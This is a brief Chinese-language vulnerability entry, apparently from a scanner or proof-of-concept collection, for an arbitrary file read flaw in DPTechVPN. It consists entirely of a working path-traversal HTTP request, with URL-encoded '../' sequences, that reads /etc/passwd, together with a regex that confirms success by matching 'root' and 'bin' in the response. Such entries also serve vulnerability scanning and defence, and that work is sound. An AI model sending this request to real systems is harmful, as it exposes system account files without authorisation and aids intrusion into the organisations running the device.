# DPTechVPN任意文件读取

DPTechVPN ｜ 任意文件读取/写入 ｜ —
- **请求**：`GET /..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1`
- **响应特征**：200 ^(?=.*?root)(?=.*?bin).*?$